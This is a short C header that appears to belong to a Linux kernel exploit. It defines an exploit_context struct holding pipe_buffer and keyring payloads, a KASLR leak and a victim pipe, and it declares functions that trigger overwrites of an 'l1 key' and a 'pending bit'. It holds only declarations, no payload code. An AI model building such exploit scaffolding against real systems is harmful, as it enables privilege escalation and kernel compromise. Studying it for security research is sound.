#ifndef __LIBPRIMITIVE_H__
#define __LIBPRIMITIVE_H__

#include <stddef.h>
#include "keyring.h"
#include "pipe_buffer.h"

typedef struct exploit_context {
    int sock;
    struct pipe_buffer_payload payload;
    struct keyring_payload leak_payload;
    struct leak *leak;
    long kaslr_phys_base;
    struct pipe *pipe_buffer;
    struct pipe *victim_pipe;
    char *zap_buf;
    size_t zap_buf_size;
} exploit_context;

struct exploit_context *setup(void);
void trigger_overwrite_of_l1_key(struct exploit_context *ctx);
void set_up_overwrite_of_pending_bit(struct exploit_context *ctx);
void trigger_overwrite_of_pending_bit(struct exploit_context *ctx);

#endif /* __LIBPRIMITIVE_H__ */
